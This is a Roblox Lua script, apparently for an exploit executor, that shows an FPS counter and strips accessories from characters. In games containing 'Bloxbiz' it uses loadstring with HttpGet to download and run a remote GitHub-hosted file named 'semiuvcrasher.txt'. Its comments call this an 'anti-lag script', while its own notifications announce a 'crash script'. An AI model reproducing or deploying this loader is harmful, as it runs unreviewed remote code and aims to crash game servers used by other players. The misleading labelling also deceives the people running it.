local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Create a TextLabel to display FPS on the screen
local player = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui", player.PlayerGui)
local fpsLabel = Instance.new("TextLabel")
fpsLabel.Parent = screenGui
fpsLabel.Size = UDim2.new(0, 200, 0, 50)  -- Adjust size as necessary
fpsLabel.Position = UDim2.new(0, 10, 0, 10)  -- Position in the top-left corner
fpsLabel.BackgroundTransparency = 0.5
fpsLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fpsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fpsLabel.Font = Enum.Font.SourceSans
fpsLabel.TextSize = 20
fpsLabel.Text = "FPS: 0"

-- Function to check if the game contains "Bloxbiz"
local function checkForBloxbiz()
    for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
        if item.Name:lower():find("bloxbiz") then
            return true
        end
    end
    return false
end

-- Function to remove all accessories from a player's character
local function removeAllAccessories(player)
    local character = player.Character or player.CharacterAdded:Wait()

    -- Wait for a brief moment to ensure the accessories are fully loaded
    wait(1)  -- Add a small delay to ensure the character and accessories are loaded

    -- Iterate through all descendants of the character and remove any accessories
    for _, item in pairs(character:GetDescendants()) do
        if item:IsA("Accessory") then
            item:Destroy()  -- Remove the accessory
        end
    end
end

-- FPS calculation variables
local frames = 0
local fps = 0
local lastUpdateTime = tick()

-- Function to update FPS
RunService.RenderStepped:Connect(function()
    frames = frames + 1

    -- Update FPS every second
    if tick() - lastUpdateTime >= 1 then
        fps = frames
        frames = 0
        lastUpdateTime = tick()

        -- Update FPS display
        fpsLabel.Text = "FPS: " .. tostring(fps)

        -- Check if FPS is below 20 and remove accessories from all players
        if fps < 20 then
            for _, otherPlayer in ipairs(Players:GetPlayers()) do
                if otherPlayer.Character then
                    removeAllAccessories(otherPlayer)
                end
            end
            StarterGui:SetCore("SendNotification", {
                Title = "Low FPS Detected",
                Text = "FPS dropped below 20. All accessories removed from all players.",
                Duration = 5
            })
        end
    end
end)

-- Check if "Bloxbiz" is present in the game
if checkForBloxbiz() then
    -- Notify the player that the game is supported
    StarterGui:SetCore("SendNotification", {
        Title = "Game Supported",
        Text = "This game contains Bloxbiz and is supported.",
        Duration = 5
    })

    -- Execute the loadstring for anti-lag script
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"))()
    end)

    if success then
        -- Notify the player that the anti-lag script was executed
        StarterGui:SetCore("SendNotification", {
            Title = "Stellar Crasher Executed",
            Text = "The crash script has been executed.",
            Duration = 5
        })
    else
        warn("Failed to execute the script: " .. err)
    end

    -- Wait for a short delay before removing accessories after executing the anti-lag script
    wait(2)  -- Give some time for the anti-lag script to run before removing accessories
    removeAllAccessories(player)

    StarterGui:SetCore("SendNotification", {
        Title = "Accessories Removed",
        Text = "All accessories have been removed from your character.",
        Duration = 5
    })
else
    -- Notify the player that the game is not supported
    StarterGui:SetCore("SendNotification", {
        Title = "Game Not Supported",
        Text = "This game does not contain Bloxbiz.",
        Duration = 5
    })
end

-- Optional: Remove accessories when the player respawns
Players.LocalPlayer.CharacterAdded:Connect(function()
    if checkForBloxbiz() then
        wait(1)  -- Wait a moment for the character to load before removing accessories
        removeAllAccessories(player)
        StarterGui:SetCore("SendNotification", {
            Title = "Accessories Removed",
            Text = "All accessories have been removed from your character.",
            Duration = 5
        })
    end
end)